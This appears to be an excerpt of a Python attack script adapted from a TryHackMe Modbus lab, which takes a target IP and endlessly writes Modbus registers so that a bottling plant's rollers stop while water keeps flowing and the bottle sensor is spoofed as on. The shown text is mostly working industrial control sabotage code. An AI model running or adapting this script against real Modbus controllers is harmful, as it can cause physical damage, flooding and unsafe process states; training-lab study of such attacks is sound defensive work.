...
# Modified version of the TryHackMe Modbus attack_stop_fill2.py file
...
if len(sys.argv) != 2:
    ...
    print("Usage: ./attack_stop_fill2.py ip_address")
    sys.exit()
...
print('Stop the rollers but let the water flow & keep bottle sensor on')

while True:
    client.write_register(1, 0) # Keep water sensor off (water keeps flowing)
    client.write_register(2, 1) # Keep botte sensor on (system thinks a bottle is under the nozzle)
